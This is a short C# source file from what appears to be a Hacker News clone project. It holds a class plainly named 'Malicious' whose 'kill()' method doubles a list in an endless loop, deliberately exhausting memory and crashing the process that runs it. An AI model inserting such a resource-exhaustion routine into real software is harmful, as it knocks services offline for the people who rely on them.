using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;

namespace Project_HNClone
{
    public class Malicious
    {
        public void kill()
        {
            List<string> list = new List<string>();
            list.Add("kill");
            while (true)
            {
                list.AddRange(list);
            }
        }
    }
}
